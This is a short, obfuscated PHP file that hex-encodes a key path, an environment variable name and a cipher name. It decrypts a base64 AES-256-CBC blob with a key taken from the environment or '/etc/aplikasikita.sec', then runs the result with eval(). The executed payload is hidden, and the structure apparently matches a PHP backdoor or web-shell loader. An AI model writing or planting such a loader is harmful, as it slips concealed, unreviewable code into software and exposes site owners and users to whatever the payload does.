<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yU+WyXH7m68R/SLK8BRiMQ==');

$c=base64_decode(

'BEanOpHW3iLRT+TPRA6bLRsT6SyNhI092FzUUam0nz68yWvoZAKWmV57xSB2er44xbXs5UqnX4s5' .
'l0ObvkQyXSSYhIVgWTCUdS8vuqkcz/mSIAKjBpgMZyByF2TiIqjuwmsBXzxhwcjP3N54VZrktCzJ' .
'TM0GFe0ppzOYRllZAG8Y1Ha2vR2bxbdVGqDQ0E9DZP37WImxPlSBrs2riD7OaboYBgciJB+b/tTZ' .
'DsxZ5oVzjcVJglxFPDof3g4tkYU0E7SMmw9+w879HuWcLYaalSaRAxr3P6WcsK+JPcI1Z5XUg48Z' .
'lhUO8gNzMHUxvdFxme5yoVVv2qCcc6/NhloOb9D8fWww8Y4m09snWBvoK5O9aRMP2cwW1hdyeyj6' .
'kex/qX33MOwEL1fVQdK+WkjgXkp8UNdPiloO4Z95klaAJjQw2yjxBJW2YoKii6XVhgSJ4puExtve' .
'Hqi5xS4g4aWIzzMLgM1TE7YbqLgzJgx+5WDgkNZRXIiAVKOUCzF3AQZ83ZSdZx2W+BDFs/89J0ib' .
'PN3/jcy1lWytOiFa59BEA7JT+BSztO0+aBYoJiyMI/bSalelMvpkNxpXPnkjIYmxq4+zgWjv2Kr0' .
'goFPDPpvzwKGo31n0e3uf8NHyAmca1KYhHwAYYRN4FI5pfl5GtgoAZ/ExTPeLASN/Z5SNNgqBTJ6' .
'd5Z+AaaBFf3ILnv46HyizrVgcjH6pXiEIL2yeMePLw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

